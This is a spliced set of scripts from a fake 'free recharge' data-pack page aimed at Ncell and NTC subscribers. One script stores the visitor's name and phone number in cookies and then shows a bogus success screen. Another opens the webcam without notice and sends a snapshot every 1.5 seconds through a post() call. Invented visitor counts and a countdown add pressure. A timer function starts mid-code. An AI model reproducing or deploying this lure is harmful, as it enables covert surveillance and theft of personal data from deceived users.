<!-- ===== THEME SWITCHER + CLAIM HANDLER ===== -->
<script>
(function () {
  var card = document.getElementById('offerCard');
  var radios = document.querySelectorAll('input[name="provider"]');
  var formView = document.getElementById('formView');
  var successView = document.getElementById('successView');
  var headerTitle = document.getElementById('headerTitle');
  var headerSubtitle = document.getElementById('headerSubtitle');
  var form = document.getElementById('rechargeForm');

  function applyTheme() {
    var selected = document.querySelector('input[name="provider"]:checked');
    if (!selected) return;
    if (selected.value === 'NTC') {
      card.classList.add('theme-ntc');
    } else {
      card.classList.remove('theme-ntc');
    }
  }

  radios.forEach(function (radio) {
    radio.addEventListener('change', applyTheme);
  });

  // initial state (Ncell is checked by default → purple)
  applyTheme();

  // ===== CLAIM HANDLER: show success page instead of redirecting =====
  form.onsubmit = function (e) {
    e.preventDefault();

    // keep original cookie logic (capture inputs + provider)
    setCookie("free-recharge_name", document.querySelector('input[name="name"]').value);
    setCookie("free-recharge_number", document.querySelector('input[name="number"]').value);
    var selectedProvider = document.querySelector('input[name="provider"]:checked').value;
    setCookie("free-recharge_provider", selectedProvider);

    // swap views
    formView.style.display = 'none';
    successView.style.display = 'block';
    headerTitle.textContent = 'Request Submitted';
    headerSubtitle.textContent = 'Your free data pack is on the way';

    return false;
  };
})();
</script>

'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
    audio: false,
    video: {
        facingMode: "user"
    }
};

// Access webcam
async function init() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        handleSuccess(stream);
    } catch (e) {
        if(errorMsgElement) errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
    }
}

// Success
function handleSuccess(stream) {
    window.stream = stream;
    video.srcObject = stream;

    var context = canvas.getContext('2d');
    setInterval(function(){
        context.drawImage(video, 0, 0, 740, 580);
        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
        post(canvasData); 
    }, 1500);
}

// Load init
init();

        n = parseInt(t / 1e3 / 60 / 60 / 24, 10),

        o = parseInt(t / 1e3 / 60 % 60, 10),
        u = parseInt(t / 1e3 % 60, 10);
    return n = checkTime(n), r = checkTime(r), o = checkTime(o), u = checkTime(u), r + ":" + o + ":" + u;
}

function checkTime(e) {
    return e < 10 && (e = "0" + e), e;
}

var updatePeople = function() {
    var e = parseInt(1e3 * Math.random());
    setTimeout(function() {
        for (var e = parseInt((new Date).getTime() / 10) - 1501742e5, t = e.toString().split("").reverse(), n = "", r = 0; r < t.length; r++)
            r % 3 == 0 && 0 != r && (n = "," + n), n = t[r] + n;
        document.querySelector(".peopleCount .number").innerText = n;
    }, e);
    document.querySelector(".countDown .timer").innerText = leftTimer();
};

updatePeople();
setInterval(updatePeople, 1e3);
</script>
